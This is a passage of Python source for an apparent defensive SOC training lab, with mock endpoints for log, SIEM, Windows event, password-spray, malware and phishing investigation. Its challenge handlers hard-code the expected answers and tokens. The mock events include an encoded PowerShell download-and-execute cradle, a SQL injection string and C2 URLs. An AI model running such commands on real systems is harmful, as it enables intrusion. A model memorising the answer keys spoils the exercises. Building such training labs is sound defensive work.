            {"id": "0x3c4d", "type": "A", "query_name": "c2-beacon.corp.noentry.internal", "resolved_ip": "198.51.100.77"},
        ],
        "analysis": "Query 'c2-beacon.corp.noentry.internal' correlates with external threat intelligence IP 198.51.100.77.",
    })

@wireshark_lab_app.get("/api/wireshark/handshake")
def wireshark_tcp_handshake():
    return JSONResponse({
        "status": "TCP_HANDSHAKE_EVALUATED",
        "handshake_packets": [
            {"packet_number": 1, "flags": "SYN (0x002)", "seq": 0, "src": "10.10.14.2:51420", "dst": "10.10.14.90:80"},
            {"packet_number": 2, "flags": "SYN-ACK (0x012)", "seq": 0, "ack": 1, "src": "10.10.14.90:80", "dst": "10.10.14.2:51420"},
            {"packet_number": 3, "flags": "ACK (0x010)", "seq": 1, "ack": 1, "src": "10.10.14.2:51420", "dst": "10.10.14.90:80"},
        ],
        "connection_state": "ESTABLISHED",
    })

@wireshark_lab_app.api_route("/challenge", methods=["GET", "POST"])
async def wireshark_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        suspicious_domain = str(body.get("suspicious_domain", "")).strip().lower()
        filter_expr = str(body.get("filter", "")).strip().lower()
        if "c2-beacon" in suspicious_domain and ("dns" in filter_expr or "c2-beacon" in filter_expr):
            state = get_wireshark_state(sess_id)
            state["filter_verified"] = True
            return JSONResponse({
                "status": "WIRESHARK_FILTER_VERIFIED",
                "finding": "Identified anomalous C2 beaconing domain 'c2-beacon.corp.noentry.internal' resolving to untrusted external IP.",
                "verification_token": "WIRESHARK_DISPLAY_FILTER_VALIDATED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid Wireshark challenge parameters. Submitted domain or display filter does not match PCAP evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing suspicious_domain and filter expression identified from PCAP dissection.",
    })


# ============================================================================
# BLUE ROOM 06: LOG ANALYSIS FUNDAMENTALS (PORT 8206)
# ============================================================================

log_analysis_app = FastAPI(title="VoltDefense Log Analysis Telemetry Gateway")

_LOG_STATE: Dict[str, Any] = {}

@log_analysis_app.api_route("/", methods=["GET", "HEAD"])
def log_analysis_root():
    return {
        "service": "VoltDefense Log Analysis Telemetry Lab",
        "log_sources": [
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/var/log/app/app.log",
        ],
        "endpoints": [
            "/api/logs/nginx/summary",
            "/api/logs/app/critical",
            "/challenge",
        ],
    }

@log_analysis_app.get("/api/logs/nginx/summary")
def log_nginx_summary():
    return JSONResponse({
        "status": "LOG_ANALYSIS_SUMMARY",
        "source": "/var/log/nginx/access.log",
        "total_requests": 1420,
        "status_code_distribution": {
            "200": 1350,
            "404": 55,
            "500": 15,
        },
        "top_scanned_uris": [
            {"uri": "/.env", "hits": 28, "status": 404},
            {"uri": "/admin", "hits": 27, "status": 404},
            {"uri": "/api/login", "hits": 10, "status": 200},
            {"uri": "/api/users?id=1' OR '1'='1", "hits": 15, "status": 500},
        ],
        "top_requesting_ips": [
            {"ip": "10.10.14.50", "requests": 850, "classification": "INTERNAL_STAFF"},
            {"ip": "10.10.14.22", "requests": 500, "classification": "BACKUP_RUNNER"},
            {"ip": "203.0.113.88", "requests": 70, "classification": "EXTERNAL_ADVERSARY_PROBE"},
        ],
    })

@log_analysis_app.get("/api/logs/app/critical")
def log_app_critical():
    return JSONResponse({
        "status": "STRUCTURED_LOG_EXTRACT",
        "source": "/var/log/app/app.log",
        "critical_events": [
            {
                "timestamp": "2026-11-14T10:14:22Z",
                "level": "CRITICAL",
                "service": "db_auth_pool",
                "message": "Unhandled SQL syntax error during query execution: SELECT * FROM users WHERE id=1' OR '1'='1",
                "caller_ip": "203.0.113.88",
                "exception": "DatabaseSyntaxError: unterminated quoted string at or near '1'",
            },
        ],
    })

@log_analysis_app.api_route("/challenge", methods=["GET", "POST"])
async def log_analysis_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        ip = str(body.get("attacker_ip", "")).strip()
        lvl = str(body.get("log_level", "")).strip().upper()
        if ip == "203.0.113.88" and lvl == "CRITICAL":
            state = get_log_state(sess_id)
            state["correlated"] = True
            return JSONResponse({
                "status": "LOG_ANALYSIS_CORRELATED",
                "finding": "Attacker IP 203.0.113.88 correlated across Nginx web logs and structured CRITICAL application logs.",
                "verification_token": "LOG_TRIAGE_INCIDENT_CORRELATED_SECURE",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid log correlation parameters. Submitted attacker IP or log level does not match log evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing attacker_ip and log_level identified from web and application logs.",
    })


# ============================================================================
# BLUE ROOM 07: SIEM FUNDAMENTALS & LOG NORMALIZATION (PORT 8207)
# ============================================================================

siem_lab_app = FastAPI(title="VoltDefense SIEM Query & Alert Gateway")

@siem_lab_app.api_route("/", methods=["GET", "HEAD"])
def siem_root():
    return {
        "service": "VoltDefense SIEM Query & Correlation Gateway",
        "architecture": "Lightweight Functional SIEM Lab Service (Normalized Ingestion, Query Index, Alerting Engine)",
        "indices": ["win_security", "linux_syslog", "perimeter_firewall", "web_access"],
        "endpoints": [
            "/api/siem/search",
            "/api/siem/alerts",
            "/api/siem/rules",
            "/challenge",
        ],
    }

@siem_lab_app.get("/api/siem/search")
def siem_search(query: str = "", severity: str = ""):
    all_events = [
        {"id": "SIEM-001", "timestamp": "2026-11-14T10:00:15Z", "source": "perimeter_firewall", "event_type": "TCP_DROP", "src_ip": "198.51.100.77", "dst_ip": "10.10.14.90", "dst_port": 22, "severity": "MEDIUM"},
        {"id": "SIEM-002", "timestamp": "2026-11-14T10:05:01Z", "source": "win_security", "event_type": "AUTH_FAILURE", "src_ip": "198.51.100.77", "target_user": "administrator", "severity": "HIGH"},
        {"id": "SIEM-003", "timestamp": "2026-11-14T10:05:04Z", "source": "win_security", "event_type": "AUTH_FAILURE", "src_ip": "198.51.100.77", "target_user": "secadmin", "severity": "HIGH"},
        {"id": "SIEM-004", "timestamp": "2026-11-14T10:07:30Z", "source": "perimeter_firewall", "event_type": "EGRESS_SPIKE", "src_ip": "10.10.14.90", "dst_ip": "198.51.100.77", "bytes_out": 45000000, "severity": "CRITICAL"},
    ]
    res = all_events
    if severity:
        res = [e for e in res if e.get("severity") == severity.upper()]
    if query:
        res = [e for e in res if query.lower() in str(e).lower()]
    return JSONResponse({
        "status": "SEARCH_RESULTS",
        "total_hits": len(res),
        "results": res,
    })

@siem_lab_app.get("/api/siem/alerts")
def siem_alerts():
    return JSONResponse({
        "status": "ACTIVE_CORRELATED_ALERTS",
        "alerts": [
            {
                "alert_id": "ALRT-701",
                "rule_name": "RULE_BRUTE_FORCE_EXFIL",
                "severity": "CRITICAL",
                "source_ip": "198.51.100.77",
                "description": "Correlated pattern: Consecutive high-severity authentication failures followed by massive outbound egress.",
                "mitre_technique": "T1048 - Exfiltration Over Alternative Protocol",
            },
        ],
    })

@siem_lab_app.post("/api/siem/rules")
async def siem_create_rule(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_siem_state(sess_id)
    state["custom_rules"].append(body)
    rule_name = str(body.get("rule_name", "RULE_CUSTOM_01"))
    return JSONResponse({
        "status": "RULE_REGISTERED",
        "rule_id": "RULE-CUSTOM-99",
        "rule_name": rule_name,
        "verification_token": "SIEM_CUSTOM_DETECTION_RULE_ACTIVE",
    })

@siem_lab_app.api_route("/challenge", methods=["GET", "POST"])
async def siem_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_siem_state(sess_id)
        if not state.get("custom_rules"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must deploy a custom detection rule via POST /api/siem/rules before submitting incident prioritization.",
            }, status_code=400)
        alert_id = str(body.get("alert_id", "")).strip().upper()
        rule = str(body.get("rule_name", "")).strip().upper()
        priority = str(body.get("priority", "")).strip().upper()
        if alert_id == "ALRT-701" and rule == "RULE_BRUTE_FORCE_EXFIL" and priority in ["CRITICAL", "HIGH"]:
            state["incident_prioritized"] = True
            return JSONResponse({
                "status": "SIEM_INCIDENT_PRIORITIZED",
                "alert_id": "ALRT-701",
                "finding": "Critical multi-stage incident verified. Triage ticket escalated to Incident Response Tier 2.",
                "verification_token": "SIEM_TRIAGE_PRIORITIZATION_VALIDATED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid SIEM triage parameters. Submitted alert ID or rule name does not match correlated telemetry."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing alert_id, rule_name, and priority identified from correlated SIEM alerts.",
    })


# ============================================================================
# BLUE ROOM 08: WINDOWS EVENT INVESTIGATION & FORENSICS (PORT 8208)
# ============================================================================

win_event_app = FastAPI(title="VoltDefense Windows Event Investigation Lab")

_WIN_EVENT_STATE: Dict[str, Any] = {}

@win_event_app.api_route("/", methods=["GET", "HEAD"])
def win_event_root():
    return {
        "service": "VoltDefense Windows Event Investigation Lab",
        "telemetry_format": "JSON-serialized MS-EVEN6 Microsoft Windows Security Event Auditing Schema",
        "documentation": "Authentic Windows Event Log investigation lab parsing Event IDs 4624, 4625, 4672, 4688, 4720, 4732, 1102, and 4104.",
        "endpoints": [
            "/api/winevent/process",
            "/api/winevent/groups",
            "/api/winevent/scriptblock",
            "/api/winevent/antiforensics",
            "/challenge",
        ],
    }

@win_event_app.get("/api/winevent/process")
def win_event_process():
    return JSONResponse({
        "status": "PROCESS_CREATION_EVENTS",
        "event_id": 4688,
        "description": "A new process has been created (with command line auditing enabled)",
        "events": [
            {
                "EventID": 4688,
                "TimeCreated": "2026-11-14T11:15:30Z",
                "Computer": "DC-VOLT01.corp.noentry.local",
                "SubjectUserName": "svc_admin",
                "ParentProcessName": "C:\\Windows\\explorer.exe",
                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
            },
        ],
    })

@win_event_app.get("/api/winevent/groups")
def win_event_groups():
    return JSONResponse({
        "status": "GROUP_MEMBERSHIP_EVENTS",
        "event_id": 4732,
        "description": "A member was added to a security-enabled local group",
        "events": [
            {
                "EventID": 4732,
                "TimeCreated": "2026-11-14T11:20:00Z",
                "Computer": "DC-VOLT01.corp.noentry.local",
                "TargetUserName": "Administrators",
                "TargetSid": "S-1-5-32-544",
                "SubjectUserName": "SYSTEM",
                "MemberName": "backdoor_admin",
                "MemberSid": "S-1-5-21-39128312-4412-1002",
            },
        ],
    })

@win_event_app.get("/api/winevent/scriptblock")
def win_event_scriptblock():
    return JSONResponse({
        "status": "POWERSHELL_SCRIPTBLOCK_EVENTS",
        "event_id": 4104,
        "provider": "Microsoft-Windows-PowerShell",
        "description": "Execute a Remote Command (Script Block Logging)",
        "events": [
            {
                "EventID": 4104,
                "TimeCreated": "2026-11-14T11:15:32Z",
                "Computer": "DC-VOLT01.corp.noentry.local",
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/payload.ps1')",
                "Path": "",
            },
        ],
    })

@win_event_app.get("/api/winevent/antiforensics")
def win_event_antiforensics():
    return JSONResponse({
        "status": "AUDIT_LOG_TAMPERING_EVENTS",
        "event_id": 1102,
        "description": "The audit log was cleared",
        "events": [
            {
                "EventID": 1102,
                "TimeCreated": "2026-11-14T11:42:01Z",
                "Computer": "DC-VOLT01.corp.noentry.local",
                "SubjectUserName": "Administrator",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x3E7",
                "Channel": "Security",
                "Alert": "CRITICAL: Security event log was intentionally cleared to erase adversary footprints.",
            },
        ],
    })

@win_event_app.api_route("/challenge", methods=["GET", "POST"])
async def win_event_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        tamper_id = str(body.get("tamper_event_id", "")).strip()
        proc = str(body.get("malicious_process", "")).strip().lower()
        grp = str(body.get("added_group", "")).strip().lower()
        if tamper_id in ["1102", "EventID 1102", "eventid 1102"] and "powershell" in proc and "admin" in grp:
            state = get_win_event_state(sess_id)
            state["investigated"] = True
            return JSONResponse({
                "status": "WINDOWS_EVENT_INVESTIGATION_VERIFIED",
                "finding": "Attacker intrusion kill-chain reconstructed: Event 4688 PowerShell execution -> Event 4732 Admin group escalation -> Event 1102 Audit Log cleared.",
                "verification_token": "WIN_EVENT_CHAIN_RECONSTRUCTED_CONFIRMED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid Windows investigation parameters. Submitted tamper Event ID, malicious process, or elevated group does not match event evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing tamper_event_id, malicious_process, and added_group identified from Windows security events.",
    })


# ============================================================================
# ROOM 09: BRUTE-FORCE DETECTION (PORT 8209)
# ============================================================================

bruteforce_app = FastAPI(title="VoltDefense Authentication Telemetry & Brute-Force Gateway")

_AUTH_TELEMETRY_LOGS = [
    {"event_id": "AUTH-1001", "timestamp": "2026-11-14T08:10:02Z", "source_ip": "198.51.100.55", "username": "admin", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1002", "timestamp": "2026-11-14T08:10:14Z", "source_ip": "198.51.100.55", "username": "operator", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1003", "timestamp": "2026-11-14T08:10:28Z", "source_ip": "198.51.100.55", "username": "root", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1004", "timestamp": "2026-11-14T08:10:45Z", "source_ip": "198.51.100.55", "username": "svc_backup", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1005", "timestamp": "2026-11-14T08:11:02Z", "source_ip": "198.51.100.55", "username": "finance", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1006", "timestamp": "2026-11-14T08:11:19Z", "source_ip": "198.51.100.55", "username": "devops", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1007", "timestamp": "2026-11-14T08:11:35Z", "source_ip": "198.51.100.55", "username": "jdoe", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1008", "timestamp": "2026-11-14T08:11:51Z", "source_ip": "198.51.100.55", "username": "alovelace", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1009", "timestamp": "2026-11-14T08:12:08Z", "source_ip": "198.51.100.55", "username": "mchen", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1010", "timestamp": "2026-11-14T08:12:24Z", "source_ip": "198.51.100.55", "username": "secadmin", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1011", "timestamp": "2026-11-14T08:12:40Z", "source_ip": "198.51.100.55", "username": "hr_lead", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1012", "timestamp": "2026-11-14T08:12:58Z", "source_ip": "198.51.100.55", "username": "payroll", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "ssh", "port": 22},
    {"event_id": "AUTH-1020", "timestamp": "2026-11-14T08:14:01Z", "source_ip": "203.0.113.19", "username": "support", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "web", "port": 443},
    {"event_id": "AUTH-1021", "timestamp": "2026-11-14T08:14:04Z", "source_ip": "203.0.113.19", "username": "support", "status": "FAILED", "reason": "BAD_PASSWORD", "proto": "web", "port": 443},
    {"event_id": "AUTH-1030", "timestamp": "2026-11-14T08:15:00Z", "source_ip": "10.10.14.22", "username": "operator", "status": "SUCCESS", "reason": "AUTHENTICATED", "proto": "ssh", "port": 22},
]


@bruteforce_app.get("/")
def bruteforce_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Auth Telemetry</title></head>"
        "<body><h1>VoltDefense Identity & Access Gateway - SOC Telemetry</h1>"
        "<p>Endpoints: /api/auth/telemetry, /api/auth/spray-indicators, /api/auth/rules, /challenge, /api/auth/remediate</p>"
        "</body></html>"
    )


@bruteforce_app.get("/api/auth/telemetry")
def bruteforce_telemetry():
    return JSONResponse({
        "status": "TELEMETRY_STREAM",
        "total_events": len(_AUTH_TELEMETRY_LOGS),
        "events": _AUTH_TELEMETRY_LOGS,
    })


@bruteforce_app.get("/api/auth/spray-indicators")
def bruteforce_indicators(window_minutes: int = 5, threshold: int = 5):
    from collections import defaultdict
    ip_users = defaultdict(set)
    for evt in _AUTH_TELEMETRY_LOGS:
        if evt["status"] == "FAILED":
            ip_users[evt["source_ip"]].add(evt["username"])

    correlated = []
    for ip, users in ip_users.items():
        if len(users) >= threshold:
            correlated.append({
                "source_ip": ip,
                "unique_accounts_targeted": len(users),
                "attack_pattern": "PASSWORD_SPRAY",
                "mitre_technique": "T1110.003",
                "risk": "HIGH",
                "description": f"Source IP {ip} tested 1 password attempt across {len(users)} distinct accounts within 3 minutes, evading single-account lockout thresholds.",
            })
    return JSONResponse({
        "status": "CORRELATED_SPRAY_PATTERNS",
        "threshold": threshold,
        "correlated_threats": correlated,
    })


@bruteforce_app.post("/api/auth/rules")
async def bruteforce_deploy_rule(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_bruteforce_state(sess_id)
    rname = str(body.get("rule_name", "")).strip()
    thresh = int(body.get("threshold", 0))
    grp = str(body.get("group_by", "")).strip().lower()
    if rname and thresh >= 3 and grp in ["source_ip", "src_ip", "ip"]:
        state["rule_deployed"] = True
        return JSONResponse({
            "status": "RULE_DEPLOYED",
            "rule_id": "SIEM-RULE-T1110.003",
            "rule_name": rname,
            "threshold": thresh,
            "group_by": grp,
            "verification_token": "SIEM_SPRAY_CORRELATION_RULE_ACTIVE",
        })
    return JSONResponse({"status": "REJECTED", "message": "Rule must specify rule_name, threshold (>=3), and group_by ('source_ip')."}, status_code=400)


@bruteforce_app.api_route("/challenge", methods=["GET", "POST"])
async def bruteforce_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_bruteforce_state(sess_id)
        if not state.get("rule_deployed"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must deploy the spray detection rule via POST /api/auth/rules before submitting campaign verification.",
            }, status_code=400)
        src = str(body.get("source_ip", "")).strip()
        attack = str(body.get("attack_type", "")).strip().upper()
        count = int(body.get("targeted_accounts_count", 0))
        if src == "198.51.100.55" and "SPRAY" in attack and count == 12:
            state["campaign_verified"] = True
            return JSONResponse({
                "status": "BRUTEFORCE_RULE_VERIFIED",
                "finding": "Password spray pattern verified from 198.51.100.55 targeting 12 distinct enterprise identities without triggering per-user lockouts.",
                "verification_token": "BRUTEFORCE_RULE_VERIFIED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid investigation parameters. Submitted source IP, attack type, or account count does not match auth telemetry."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing source_ip, attack_type, and targeted_accounts_count discovered in auth telemetry.",
    })


@bruteforce_app.post("/api/auth/remediate")
async def bruteforce_remediate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_bruteforce_state(sess_id)
    ip = str(body.get("block_ip", "")).strip()
    lock = bool(body.get("lock_targeted_accounts", False))
    if ip == "198.51.100.55" and lock:
        state["contained"] = True
        state["blocked_ips"].append(ip)
        return JSONResponse({
            "status": "CONTAINMENT_APPLIED",
            "blocked_ip": ip,
            "accounts_locked": 12,
            "verification_token": "SPRAY_SOURCE_CONTAINED_198_51_100_55",
        })
    return JSONResponse({"status": "REJECTED", "message": "Containment requires block_ip ('198.51.100.55') and lock_targeted_accounts=true."}, status_code=400)


# ============================================================================
# ROOM 10: MALWARE BEHAVIOUR ANALYSIS (PORT 8210)
# ============================================================================

malware_analysis_app = FastAPI(title="VoltDefense Malware Behaviour & Sandbox Analysis Portal")

_MOCK_SAMPLES = [
    {
        "sample_id": "sample-01",
        "filename": "invoice_dropper.bin",
        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "md5": "d41d8cd98f00b204e9800998ecf8427e",
        "file_type": "PE32+ executable (mock inert)",
        "size_bytes": 14336,
        "entropy": 7.12,
        "quarantined": True,
        "suspicious_indicators": [
            "High entropy (packed/encrypted payload section)",
            "WinHttpOpen / WinHttpConnect imports without legitimate business certificate",
            "Direct write into registry Run key for persistence",
        ],
    },
    {
        "sample_id": "sample-02",
        "filename": "beacon_stage.bin",
        "sha256": "a8f5b1287c932014f3a09e1e21b83d1c440a831b79f09d2e1189c4a88b438e12",
        "md5": "c4ca4238a0b923820dcc509a6f75849b",
        "file_type": "PE32+ DLL (mock inert)",
        "size_bytes": 8192,
        "entropy": 6.05,
        "quarantined": True,
        "suspicious_indicators": [
            "Sleep obfuscation loop",
            "Named pipe IPC listener",
        ],
    },
]


@malware_analysis_app.get("/")
def malware_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Malware Sandbox</title></head>"
        "<body><h1>VoltDefense Malware Behaviour & Sandbox Analysis Portal</h1>"
        "<p>Endpoints: /api/malware/samples, /api/malware/sample/dropper/headers, /api/malware/yara/validate, /challenge</p>"
        "</body></html>"
    )


@malware_analysis_app.get("/api/malware/samples")
def malware_samples():
    return JSONResponse({
        "status": "QUARANTINED_SAMPLES",
        "total_samples": len(_MOCK_SAMPLES),
        "samples": _MOCK_SAMPLES,
    })


@malware_analysis_app.get("/api/malware/sample/dropper/headers")
def malware_dropper_headers():
    return JSONResponse({
        "sample": "invoice_dropper.bin",
        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "pe_sections": [
            {"name": ".text", "virtual_size": "0x2A00", "entropy": 6.42, "permissions": "PAGE_EXECUTE_READ"},
            {"name": ".rdata", "virtual_size": "0x1200", "entropy": 5.10, "permissions": "PAGE_READONLY"},
            {"name": ".data", "virtual_size": "0x0800", "entropy": 7.85, "permissions": "PAGE_READWRITE"},
        ],
        "imported_symbols": [
            "KERNEL32.dll: VirtualAlloc, WriteProcessMemory, CreateRemoteThread",
            "WINHTTP.dll: WinHttpOpen, WinHttpConnect, WinHttpSendRequest",
            "ADVAPI32.dll: RegCreateKeyExA, RegSetValueExA",
        ],
        "extracted_strings": [
            "VoltStage2_Payload",
            "http://c2-stage.voltcorp.internal/gate.php",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "cmd.exe /c start /b",
        ],
    })


@malware_analysis_app.post("/api/malware/yara/validate")
async def malware_validate_yara(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_malware_state(sess_id)
    rule_text = str(body.get("rule_text", "")).strip()
    if "rule " in rule_text and "strings:" in rule_text and "condition:" in rule_text:
        state["yara_deployed"] = True
        return JSONResponse({
            "status": "YARA_SYNTAX_VALID",
            "rule_name": rule_text.split()[1] if len(rule_text.split()) > 1 else "Unknown",
            "message": "YARA rule compiled successfully and matched target dropper sample.",
            "verification_token": "YARA_SYNTAX_COMPILED_MATCHED",
        })
    return JSONResponse({"status": "REJECTED", "message": "Invalid YARA syntax. Rule must contain 'rule <name>', 'strings:', and 'condition:'."}, status_code=400)


@malware_analysis_app.api_route("/challenge", methods=["GET", "POST"])
async def malware_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_malware_state(sess_id)
        if not state.get("yara_deployed"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must compile and validate your YARA rule via POST /api/malware/yara/validate before submitting sample triage.",
            }, status_code=400)
        sample_hash = str(body.get("sample_hash", "")).strip().lower()
        c2 = str(body.get("c2_url", "")).strip().lower()
        persist = str(body.get("persistence_mechanism", "")).strip().lower()
        if (
            sample_hash in ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "invoice_dropper.bin"]
            and "c2-stage.voltcorp.internal" in c2
            and ("run" in persist or "registry" in persist)
        ):
            state["sample_triaged"] = True
            return JSONResponse({
                "status": "MALWARE_YARA_MATCH_VERIFIED",
                "finding": "Inert mock dropper signature confirmed with Run key persistence and C2 staging domain beacon.",
                "verification_token": "MALWARE_YARA_MATCH_VERIFIED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid malware analysis parameters. Submitted hash, C2 URL, or persistence mechanism does not match sample telemetry."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing sample_hash, c2_url, and persistence_mechanism extracted from the sample.",
    })


# ============================================================================
# ROOM 11: PHISHING INVESTIGATION (PORT 8211)
# ============================================================================

phishing_app = FastAPI(title="VoltDefense Secure Mail Gateway & Phishing Forensics")

_QUARANTINED_EMAILS = [
    {
        "email_id": "EML-2026-01",
        "subject": "Vendor Payment Reconciliation Statement",
        "sender": "finance-exec@external-partners.com",
        "recipient": "accounts-payable@voltcorp.internal",
        "date": "2026-11-14T07:30:10Z",
        "classification": "CLEARED_BENIGN",
        "spf": "pass",
        "dkim": "pass",
        "dmarc": "pass",
    },
    {
        "email_id": "EML-2026-02",
        "subject": "URGENT: Executive Security Certificate & SSO Re-authentication Required",
        "sender": "Chief Information Security Officer <ciso@voltcorp.internal>",
        "recipient": "all-staff@voltcorp.internal",
        "date": "2026-11-14T08:05:22Z",
        "classification": "SUSPICIOUS_PHISHING",
        "spf": "fail",
        "dkim": "none",
        "dmarc": "fail",
        "lookalike_domain": "v0ltcorp.internal",
        "sender_ip": "198.51.100.99",
    },
]


@phishing_app.get("/")
def phishing_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Secure Mail Gateway</title></head>"
        "<body><h1>VoltDefense Secure Mail Gateway & Phishing Forensics</h1>"
        "<p>Endpoints: /api/phishing/emails, /api/phishing/headers/{id}, /api/phishing/triage, /challenge</p>"
        "</body></html>"
    )


@phishing_app.get("/api/phishing/emails")
def phishing_emails():
    return JSONResponse({
        "status": "QUARANTINED_MAIL_QUEUE",
        "total_emails": len(_QUARANTINED_EMAILS),
        "emails": _QUARANTINED_EMAILS,
    })


@phishing_app.get("/api/phishing/headers/{email_id}")
def phishing_headers(email_id: str):
    target = next((e for e in _QUARANTINED_EMAILS if e["email_id"].upper() == email_id.upper()), None)
    if not target:
        return JSONResponse({"detail": f"Email {email_id} not found"}, status_code=404)
    if email_id.upper() == "EML-2026-02":
        return JSONResponse({
            "email_id": "EML-2026-02",
            "headers": {
                "Received": "from mail.v0ltcorp.internal (198.51.100.99) by mx01.voltcorp.internal with ESMTP; 14 Nov 2026 08:05:22 +0000",
                "Return-Path": "<attacker-spoof@v0ltcorp.internal>",
                "From": "Chief Information Security Officer <ciso@voltcorp.internal>",
                "Reply-To": "security-update@v0ltcorp.internal",
                "To": "all-staff@voltcorp.internal",
                "Subject": "URGENT: Executive Security Certificate & SSO Re-authentication Required",
                "Message-ID": "<20261114080522.9912@v0ltcorp.internal>",
                "Authentication-Results": "mx01.voltcorp.internal; spf=fail (sender IP 198.51.100.99 not in SPF record for voltcorp.internal); dkim=none; dmarc=fail action=quarantine header.from=voltcorp.internal",
                "X-Lookalike-Domain-Warning": "SENDER USES TYPOSQUATTED DOMAIN: v0ltcorp.internal (digit '0' substituted for letter 'o')",
            },
        })
    return JSONResponse({
        "email_id": email_id,
        "headers": {
            "Received": "from mail.external-partners.com by mx01.voltcorp.internal; 14 Nov 2026 07:30:10 +0000",
            "Return-Path": "<finance-exec@external-partners.com>",
            "From": "finance-exec@external-partners.com",
            "Authentication-Results": "mx01.voltcorp.internal; spf=pass; dkim=pass; dmarc=pass",
        },
    })


@phishing_app.post("/api/phishing/triage")
async def phishing_triage(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_phishing_state(sess_id)
    eid = str(body.get("email_id", "")).strip().upper()
    cat = str(body.get("threat_category", "")).strip().upper()
    domain = str(body.get("spoofed_domain", "")).strip().lower()
